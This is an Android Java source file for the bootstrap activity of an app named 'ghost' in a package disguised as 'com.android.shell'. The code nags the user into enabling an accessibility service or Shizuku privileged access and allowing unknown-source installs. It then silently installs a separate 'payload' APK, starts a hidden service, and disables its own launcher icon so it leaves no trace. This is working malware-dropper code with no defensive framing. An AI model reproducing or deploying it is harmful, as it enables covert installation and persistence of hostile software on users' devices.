package com.android.shell.ghost;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.View;
import android.view.accessibility.AccessibilityManager;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import java.io.File;

/**
 * Visible bootstrap screen.
 *
 * It only exists until the accessibility service can drive the install.
 * As soon as the service is enabled the launcher alias is disabled, so the
 * wrapper leaves no icon behind (no root required).
 */
public class MainActivity extends Activity {

    private final Handler handler = new Handler(Looper.getMainLooper());
    private TextView step;
    private ProgressBar progress;
    private Button settings;
    private long lastSettingsOpen;
    private boolean started;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        step = findViewById(R.id.step);
        progress = findViewById(R.id.progress);
        settings = findViewById(R.id.settings);
        settings.setOnClickListener(v -> openSettings());
        handler.postDelayed(this::proceed, 250);
    }

    @Override
    protected void onResume() {
        super.onResume();
        handler.postDelayed(this::proceed, 400);
    }

    private boolean a11yEnabled() {
        try {
            AccessibilityManager am = (AccessibilityManager) getSystemService(ACCESSIBILITY_SERVICE);
            if (am != null) {
                for (AccessibilityServiceInfo info :
                        am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)) {
                    if (info.getId() != null && info.getId().startsWith(getPackageName())) return true;
                }
            }
        } catch (Throwable ignored) {}
        String enabled = Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return enabled != null && enabled.contains(getPackageName() + "/")
                || (enabled != null && enabled.contains("GhostAccessibilityService"));
    }

    private void proceed() {
        if (isFinishing()) return;
        boolean shizukuReady = ShizukuBridge.available() && ShizukuBridge.permitted();

        if (!a11yEnabled() && !shizukuReady) {
            progress.setVisibility(View.VISIBLE);
            settings.setVisibility(View.VISIBLE);
            if (ShizukuBridge.available()) {
                step.setText("Approve Shizuku access to install without prompts.");
                if (!ShizukuBridge.permitted()) {
                    ShizukuBridge.request();
                    return;
                }
            } else if (ShizukuBridge.installed(this)) {
                step.setText("Start Shizuku (wireless debugging), then return here.");
                if (System.currentTimeMillis() - lastSettingsOpen > 8000) {
                    lastSettingsOpen = System.currentTimeMillis();
                    try {
                        Intent s = getPackageManager().getLaunchIntentForPackage(
                                "moe.shizuku.privileged.api");
                        if (s != null) startActivity(s);
                    } catch (Throwable ignored) {}
                }
                return;
            } else {
                step.setText(R.string.setup_step_a11y);
                if (System.currentTimeMillis() - lastSettingsOpen > 15000) {
                    openAccessibility();
                }
                return;
            }
        }

        GhostAccessibilityService.startHiddenService(this);
        if (!shizukuReady && !getPackageManager().canRequestPackageInstalls()) {
            progress.setVisibility(View.VISIBLE);
            step.setText(R.string.setup_step_unknown);
            settings.setVisibility(View.VISIBLE);
            if (System.currentTimeMillis() - lastSettingsOpen > 15000) {
                openUnknownSources();
            }
            return;
        }

        settings.setVisibility(View.GONE);
        step.setText(R.string.setup_step_installing);
        progress.setVisibility(View.VISIBLE);

        File apk = PayloadInstaller.obtainPayload(this);
        if (apk != null && PayloadInstaller.installedInfo(this, PayloadInstaller.PAYLOAD_PACKAGE) != null
                && PayloadInstaller.installedVersion(this, PayloadInstaller.PAYLOAD_PACKAGE)
                    >= PayloadInstaller.apkVersion(apk, this)
                && PayloadInstaller.sameSigner(this, PayloadInstaller.PAYLOAD_PACKAGE, apk)) {
            setSetupHidden();
            GhostAccessibilityService.onPayloadReady(this);
            step.setText(R.string.setup_step_done);
            handler.postDelayed(this::finish, 900);
            return;
        }

        if (!started) {
            started = true;
            PayloadInstaller.start(this);
            // The install UI takes over; do not finish instantly so the user
            // can come back to this screen if the dialog is dismissed.
            handler.postDelayed(() -> {
                if (isFinishing()) return;
                if (PayloadInstaller.installedInfo(
                        this, PayloadInstaller.PAYLOAD_PACKAGE) != null) {
                    finish();
                    return;
                }
                PayloadInstaller.relaunchPendingUi(this);
                PayloadInstaller.start(this);
            }, 5000);
        }
    }

    private void openSettings() {
        if (!a11yEnabled()) openAccessibility();
        else openUnknownSources();
    }

    private void openAccessibility() {
        lastSettingsOpen = System.currentTimeMillis();
        Toast.makeText(this, R.string.setup_step_a11y, Toast.LENGTH_LONG).show();
        try {
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        } catch (Throwable ignored) {}
    }

    private void openUnknownSources() {
        lastSettingsOpen = System.currentTimeMillis();
        try {
            Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                    Uri.parse("package:" + getPackageName()));
            startActivity(i);
        } catch (Throwable t) {
            try {
                startActivity(new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES));
            } catch (Throwable ignored) {}
        }
    }

    private void setSetupHidden() {
        try {
            getPackageManager().setComponentEnabledSetting(
                    new ComponentName(this, getPackageName() + ".LauncherAlias"),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
        } catch (Throwable ignored) {}
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == ShizukuBridge.REQUEST_CODE) {
            handler.postDelayed(this::proceed, 300);
        }
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}
